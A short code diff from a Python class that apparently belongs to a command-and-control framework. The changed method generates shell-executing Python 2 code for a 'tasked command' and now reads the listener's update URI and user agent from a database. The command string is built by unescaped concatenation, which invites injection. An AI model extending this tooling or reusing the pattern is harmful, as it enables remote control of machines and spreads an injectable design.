@@ -38,5 +38,12 @@ class Tasking(object):
         '''
             Description: Generates Python 2.x code to execute a tasked command
         '''
+        # gets "update_uri" and "user_agent" from the "listeners" table
+        # this will be added to the generate command
+        with self.connection.cursor() as cursor:
+            cursor.execute("SELECT `update_uri`, `user_agent` FROM `listeners`")
+            self.update_uri, self.user_agent = cursor.fetchone()
+
+        # TO DO: add in update http request based on queried "update_uri"
         command = "import subprocess; process = subprocess.Popen('" + self.task_action + "', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); output, error = process.communicate(); print output, error;"
         print(command)
